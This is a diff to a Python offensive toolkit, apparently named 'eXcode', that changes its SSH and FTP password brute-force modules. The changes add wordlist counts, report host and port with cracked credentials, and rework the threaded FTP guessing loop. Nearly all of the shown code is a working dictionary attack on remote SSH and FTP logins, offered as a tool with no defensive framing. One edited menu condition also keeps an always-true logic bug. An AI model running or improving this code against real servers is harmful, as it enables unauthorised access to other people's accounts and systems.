@@ -15,6 +15,7 @@ import mechanize
 from mechanize import Browser
 from threading import Thread
 import queue
+import readline
 
 #-------------------------------------------------------------#
 
@@ -40,7 +41,7 @@ SSHPORT = 22
 FTPPORT = 21
 client = SSHClient()
 sshusername = ''
-ftpusername = ''
+ftpusername = 's'
 url = ""
 sucurl = ""
 webuser = ""
@@ -289,6 +290,13 @@ def decryptfile():
 #------------------------bruteforce ssh-----------------------#
 
 def sshP():
+
+    sshppasswords = open(wordlist).read().split("\n")
+    n=0
+    for i in sshppasswords:
+        n += 1
+    print("[" + Fore.LIGHTYELLOW_EX + wordlist + Fore.RESET + "] : " + Fore.LIGHTYELLOW_EX + str(n) + " words loaded" + Fore.RESET)
+
     try:        
         client.load_system_host_keys()
         # client.load_host_keys('/Users/User/.ssh/known_hosts')
@@ -301,10 +309,12 @@ def sshP():
                 passwords = str(lines[i].strip())
                 try:
                     client.connect(HOST, username=sshusername, password=passwords, port=SSHPORT)
-                    print("password found: " + Fore.LIGHTGREEN_EX + sshusername + " : " + passwords + Fore.RESET)
+                    print("password found: " + Fore.LIGHTGREEN_EX + str(HOST) + ":" + str(SSHPORT) + " " + sshusername + " : " + passwords + Fore.RESET)
                     break
                 except:
                     print(str("password failed: " + Fore.LIGHTRED_EX + passwords + Fore.RESET))
+                    sys.stdout.write("\033[F")
+                    sys.stdout.write("\033[K")
                     i += 1
         except:
             print("couldn't find the password")
@@ -317,29 +327,40 @@ def sshP():
 def ftpPass():
     host1 = HOST
     user = ftpusername
-    port = FTPPORT
+    port1 = FTPPORT
+    
+    with open(wordlist, 'r') as ftpppasswords:
+        n=0
+        for i in ftpppasswords:
+            n += 1
+        print("[" + Fore.LIGHTYELLOW_EX + wordlist + Fore.RESET + "] : " + Fore.LIGHTYELLOW_EX + str(n) + " words loaded" + Fore.RESET)
 
     def connect_ftp():
         global q
         while True:
-            ftppassword = q.get()
-            server = ftplib.FTP()
-            print("password failed: " + Fore.LIGHTRED_EX + ftppassword + Fore.RESET)
             try:
-                server.connect(host1, port, timeout=5)
-                server.login(user, ftppassword)
-            except ftplib.error_perm:
-                pass
-            else:
-                print("password found: " + Fore.GREEN + user + " : " + ftppassword + Fore.RESET)
-                with q.mutex:
-                    q.queue.clear()
-                    q.all_tasks_done.notify_all()
-                    q.unfinished_tasks = 0
-            finally:
+                ftppassword = q.get()
+                server = ftplib.FTP()
+                print("password failed: " + Fore.LIGHTRED_EX + ftppassword + Fore.RESET)
+                sys.stdout.write("\033[F")
+                sys.stdout.write("\033[K")
+                try:
+                    server.connect(host1, port1, timeout=5)
+                    server.login(user, ftppassword)
+                except ftplib.error_perm:
+                    pass
+                else:
+                    print("password found: " + Fore.GREEN + str(HOST) + ":" + str(FTPPORT) + " "  + user + " : " + ftppassword + Fore.RESET)
+                    with q.mutex:
+                        q.queue.clear()
+                        q.all_tasks_done.notify_all()
+                        q.unfinished_tasks = 0
+                finally:
+                    q.task_done()
+            except:
                 break
     try:
-        ftppasswords = open(wordlist).read().split("\n")
+        ftppasswords = open(wordlist, 'r').read().split("\n")
         for ftppassword in ftppasswords:
             q.put(ftppassword)
         for t in range(n_threads):
@@ -463,7 +484,7 @@ while True:
                 elif use == str(library_list[6]) or int(use) == 6:
                     excodeInput = "eXcode(" + Fore.RED + str(library_list[6]) + Fore.GREEN + ")> "
                     using = "webP"
-                elif use == "." or "nothing":
+                elif use == ".." or "nothing":
                     using = "nothing"
                     excodeInput = "eXcode> "
                 else:
@@ -743,4 +764,3 @@ while True:
             print('unknown command: ' + excode)
     except KeyboardInterrupt:
         print("")
-
